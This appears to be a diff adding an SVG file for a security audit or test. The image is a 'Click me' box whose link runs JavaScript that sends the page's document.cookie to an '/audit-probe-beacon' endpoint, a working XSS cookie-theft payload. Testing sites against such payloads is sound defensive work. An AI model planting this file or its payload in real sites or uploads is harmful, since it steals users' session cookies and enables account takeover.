@@ -1,0 +1,7 @@
+<?xml version="1.0" standalone="no"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="100">
+  <a xlink:href="javascript:fetch('/audit-probe-beacon?h=H3&c=' + encodeURIComponent(document.cookie));">
+    <rect width="200" height="100" fill="green"/>
+    <text x="10" y="60" font-size="20" fill="white">Click me</text>
+  </a>
+</svg>
